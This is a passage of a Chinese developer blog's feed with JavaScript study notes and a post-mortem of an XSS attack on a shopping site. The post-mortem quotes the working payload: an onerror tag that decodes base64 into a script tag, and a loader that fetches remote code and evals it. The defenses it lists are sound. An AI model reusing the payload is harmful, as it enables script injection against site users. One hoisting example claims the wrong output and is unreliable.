      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中实际上并不存在“类”，那么它是如何实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;、&lt;strong&gt;实例化&lt;/strong&gt;等特性呢。它采用了与类不同的另一种技术，将其称之为&lt;strong&gt;原型&lt;/strong&gt;，并通过&lt;strong&gt;原型链&lt;/strong&gt;来实现&lt;strong&gt;继承&lt;/strong&gt;、&lt;strong&gt;多态&lt;/strong&gt;等特性。&lt;/p&gt;
&lt;p&gt;但是需要注意的是JavaScript的&lt;strong&gt;继承&lt;/strong&gt;,与Java的继承实际上有很大的区别，在Java语言中，&lt;strong&gt;继承&lt;/strong&gt;是一个&lt;strong&gt;拷贝过程&lt;/strong&gt;在物理地址上发生了拷贝，而JavaScript语言是通过&lt;strong&gt;原型链&lt;/strong&gt;将其”链接”在一起，没有发生实际的拷贝。&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端安全与防范</title>
    <link href="http://zhoushaw.github.io/2019/04/16/learning/font-end/security/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
    <id>http://zhoushaw.github.io/2019/04/16/learning/font-end/security/前端安全与防范/</id>
    <published>2019-04-16T01:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的<strong>描述</strong>中带有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;body/hidden&gt;&lt;img src=x onerror=document[&apos;write&apos;](atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;))&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>因为穿搭look中带有格式化后html的描述内容，所以直接通过<strong>v-html</strong>指令输出了描述内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-if=&quot;from === &apos;detail&apos;&quot; v-html=&quot;content&quot; ref=&quot;content&quot; style=&quot;-webkit-user-select: text&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：</p><ul><li>btoa（base64加密）</li><li>atob （base64解密）</li></ul><div><a id="more"></a></div><p>经过<code>atob</code>解密后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">atob(&apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&apos;)</span><br><span class="line"></span><br><span class="line">// 转变成</span><br><span class="line"></span><br><span class="line">&lt;body/hidden&gt;&lt;script src=https://s5.mogucdn.com/mlcdn/c45406/190415_63j65lek4d22g86c5hb7ka98l9ffe&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 一般攻击者都不会将，body隐藏。而是直接通过盗用信息</span><br></pre></td></tr></table></figure><p>通过<code>document[&#39;write&#39;]</code>将dom写入页面后，通过<code>mogucdn</code>资源将会下载脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var ua = navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">// 在微信环境下，将会通过ajax请求获取站外脚本，获取完成后通过eval动态执行</span><br><span class="line">if (/micromessenger/.test(ua)) &#123;</span><br><span class="line">    $.get(&apos;https://api.ruanwin.com/j&apos;,function(d) &#123;</span><br><span class="line">        window[&apos;ev&apos; + &apos;al&apos;](d);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所幸精选穿搭必须由产品手动审核，该look并不会进入首页，否则至少将造成P1级故障</strong></p><h2 id="安全于防范"><a href="#安全于防范" class="headerlink" title="安全于防范"></a>安全于防范</h2><blockquote><p>常见攻击手段</p></blockquote><ul><li><p>XSS</p><ul><li>跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li></ul></li><li><p>CSRF</p><ul><li>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote><p>XSS防范</p></blockquote><p>在前言中的案例，就是<code>XSS</code>攻击的典范。我们如何避免被<code>XSS</code>攻击呢，可以从以下几方面入手：</p><ul><li>输入过滤<ul><li><blockquote><p>符号转译成<code>&amp;lt;</code>等符号</p></blockquote></li></ul></li><li>内容输出<ul><li>含有<code>html</code>输出内容，对 HTML 做安全过滤。下文将详细介绍如果进行安全过滤设计</li><li>禁止使用：<code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code></li><li><strong>Vue</strong>/<strong>React</strong> 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code></li><li>过滤库<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a></li></ul></li><li>使用CSP，限制非白名单脚本加载<ul><li>http请求头添加：Content-Security-Policy</li><li>参考：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">csp防范添加</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天主站遭受了xss攻击，起因是一个普通用户发表了一个穿搭，后端接收到异常警报排查后发现用户的穿搭的&lt;strong&gt;描述&lt;/strong&gt;中带有:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;body/hidden&amp;gt;&amp;lt;img src=x onerror=document[&amp;apos;write&amp;apos;](atob(&amp;apos;PGJvZHkvaGlkZGVuPjxzY3JpcHQgc3JjPWh0dHBzOi8vczUubW9ndWNkbi5jb20vbWxjZG4vYzQ1NDA2LzE5MDQxNV82M2o2NWxlazRkMjJnODZjNWhiN2thOThsOWZmZT48L3NjcmlwdD4=&amp;apos;))&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为穿搭look中带有格式化后html的描述内容，所以直接通过&lt;strong&gt;v-html&lt;/strong&gt;指令输出了描述内容：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;div v-if=&amp;quot;from === &amp;apos;detail&amp;apos;&amp;quot; v-html=&amp;quot;content&amp;quot; ref=&amp;quot;content&amp;quot; style=&amp;quot;-webkit-user-select: text&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候攻击的html标签将会直接被注入到页面中，这里还涉及到另外一个知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;btoa（base64加密）&lt;/li&gt;
&lt;li&gt;atob （base64解密）&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="security" scheme="http://zhoushaw.github.io/categories/security/"/>
    
    
      <category term="security" scheme="http://zhoushaw.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>scope &amp; closures</title>
    <link href="http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/"/>
    <id>http://zhoushaw.github.io/2019/04/05/learning/book-notes/scope&amp;closures/</id>
    <published>2019-04-04T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p>本文是you don’t know js系列的 <a href="https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures" target="_blank" rel="noopener">作用域与闭包</a> 笔记</p><h2 id="一、作用域"><a href="#一、作用域" class="headerlink" title="一、作用域"></a>一、作用域</h2><h3 id="什么是作用域"><a href="#什么是作用域" class="headerlink" title="什么是作用域"></a>什么是作用域</h3><p>几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。</p><p>但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域</p><p><div><a id="more"></a></div></p><h3 id="理解作用域"><a href="#理解作用域" class="headerlink" title="理解作用域"></a>理解作用域</h3><p>如何正确的理解作用域呢，为了方便理解可以简单的将JavaScript程序运行时分成三大部分：</p><ul><li>引擎：负责从始至终的编译和执行我们的 JavaScript 程序。</li><li>编译器：引擎 的朋友之一；处理所有的解析和代码生成的重活儿</li><li>作用域：引擎 的另一个朋友；收集并维护一张所有被声明的标识符（变量）的列表，并对当前执行中的代码如何访问这些变量强制实施一组严格的规则。</li></ul><p>让我们来分析引擎是如何处理<code>var a = 2;</code>这样的一个语句的吧，首先一个合理的假设是：为一个变量分配一个内存，并将其标记成a。然后将2赋值到变量a中。不幸的是，这并不是十分精准的</p><p>编译器会这样处理：</p><ul><li>编译器首先会进行词法分析，将<code>var a = 2;</code>字符串打断成有意义的片段也称之为token，这段程序有可能会被打断成<code>var</code>、<code>a</code>、<code>=</code>、<code>2</code>和<code>=</code></li><li>将一个 token 的流（数组）转换为一个嵌套元素的树，它综合地表示了程序的语法结构。</li><li>词法分析和AST(抽象语法树)转换完成后，遇到<code>var a</code>，编译器会让作用域查看是否存在当前这个特定的作用域集合，变量 <code>a</code> 是否已经存在了。如果是，编译器 就忽略这个声明并继续前进。否则，编译器 就让 作用域 去为这个作用域集合声明一个称为 a 的新变量。</li><li>然后 编译器 为 引擎 生成稍后要执行的代码，来处理赋值 a = 2。引擎 运行的代码首先让 作用域 去查看在当前的作用域集合中是否有一个称为 a 的变量可以访问。如果有，引擎 就使用这个变量。如果没有，引擎 就查看 其他地方</li></ul><blockquote><p>编译器术语</p></blockquote><p>在我们这个例子中，引擎 将会对变量 <code>a</code> 实施一个“LHS”查询。另一种类型的查询称为“RHS”。</p><p>换言之，当一个变量出现在赋值操作的左手边时，会进行 LHS 查询，当一个变量出现在赋值操作的右手边时，会进行 RHS 查询。<br>可以认为LHS 查询是试着找到变量容器本身，以便它可以赋值,“RHS”意味着“取得他/她的源（值）”，暗示着 RHS 的意思是“去取……的值<br>在概念上将它考虑为：“赋值的目标（LHS）”和“赋值的源（RHS）”</p><h3 id="嵌套的作用域"><a href="#嵌套的作用域" class="headerlink" title="嵌套的作用域"></a>嵌套的作用域</h3><p>我们说过 作用域 是通过标识符名称查询变量的一组规则。但是，通常会有多于一个的 作用域 需要考虑。</p><p>就像一个代码块儿或函数被嵌套在另一个代码块儿或函数中一样，作用域被嵌套在其他的作用域中。所以，如果在直接作用域中找不到一个变量的话，引擎 就会咨询下一个外层作用域，如此继续直到找到这个变量或者到达最外层作用域（也就是全局作用域）。</p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>有一种倾向认为你在 JavaScript 程序中看到的所有代码，在程序执行的过程中都是从上到下一行一行地被解释执行的。虽然这大致上是对的，但是这种猜测中的一个部分可能会导致你错误地考虑你的程序。</p><p class="tip">在作用域的规则中，存在“变量提升”这么一个概念。不过，需要注意的是，这个概念可能产生一点点误解 。例如，从概念的字面意义上说，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，但这么说并不准确。实际上变量和函数声明在代码里的位置是不会动的，而是在编译阶段被放入内存中。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>许多开发者会期望 undefined，因为语句 var a 出现在 a = 2 之后，这很自然地看起来像是这个变量被重定义了，并因此被赋予了默认的 undefined。然而，输出将是 2。</p><blockquote><p>考虑另一个代码段：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>你可能会被诱导而这样认为：因为上一个代码段展示了一种看起来不是从上到下的行为，也许在这个代码段中，也会打印 2。另一些人认为，因为变量 a 在它被声明之前就被使用了，所以这一定会导致一个 ReferenceError 被抛出。</p><p>不幸的是，两种猜测都不正确。输出是 undefined。</p><h4 id="编译器再次袭来"><a href="#编译器再次袭来" class="headerlink" title="编译器再次袭来"></a>编译器再次袭来</h4><p>引擎 实际上将会在它解释执行你的 JavaScript 代码之前编译它。编译过程的一部分就是找到所有的声明，并将它们关联在合适的作用域上。</p><p>所以，考虑这件事情的最佳方式是，在你的代码的任何部分被执行之前，所有的声明，变量和函数，都会首先被处理。</p><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><p>于是我们的第一个代码段应当被认为是这样被处理的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br></pre></td></tr></table></figure><p>相似地，我们的第二个代码段实际上被处理为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>所以，关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置“移动”到代码的顶端。这就产生了“提升”这个名字。</p><h4 id="函数申明提升"><a href="#函数申明提升" class="headerlink" title="函数申明提升"></a>函数申明提升</h4><p class="tip">当你看到 var a = 2; 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：var a; 和 a = 2;。第一个语句，声明，是在编译阶段被处理的。第二个语句，赋值，为了执行阶段而留在 原处。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 foo 的声明（在这个例子中它还 包含 一个隐含的、实际为函数的值）被提升了，因此第一行的调用是可以执行的。</p><p class="tip">还需要注意的是，提升是 以作用域为单位的。所以虽然我们的前一个代码段被简化为仅含有全局作用域，但是我们现在检视的函数foo(..)本身展示了，var a被提升至foo(..)的顶端（很明显，不是程序的顶端）。所以这个程序也许可以更准确地解释为：</p><p>函数声明会被提升，就像我们看到的。但是函数表达式不会。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与</span></span><br><span class="line">foo(); <span class="comment">// 不是 ReferenceError， 而是 TypeError!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p class="tip">函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，函数会首先被提升，然后才是变量。</p><p>考虑这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 被打印了，而不是 2！这个代码段被 引擎 解释执行为：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 var foo 是一个重复（因此被无视）的声明，即便它出现在 function foo()… 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然多个/重复的 var 声明实质上是被忽略的，但是后续的函数声明确实会覆盖前一个。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">3</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、闭包"><a href="#二、闭包" class="headerlink" title="二、闭包"></a>二、闭包</h2><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p class="tip">简单来说可以用一句话概括闭包的特性与作用：闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li>bar() 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li>foo() 被执行之后，一般说来我们会期望 foo() 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 foo() 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 bar() 本身。</li><li>有赖于它被声明的位置，bar() 拥有一个词法作用域闭包覆盖着 foo() 的内部作用域，闭包为了能使 bar() 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li>bar() 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span 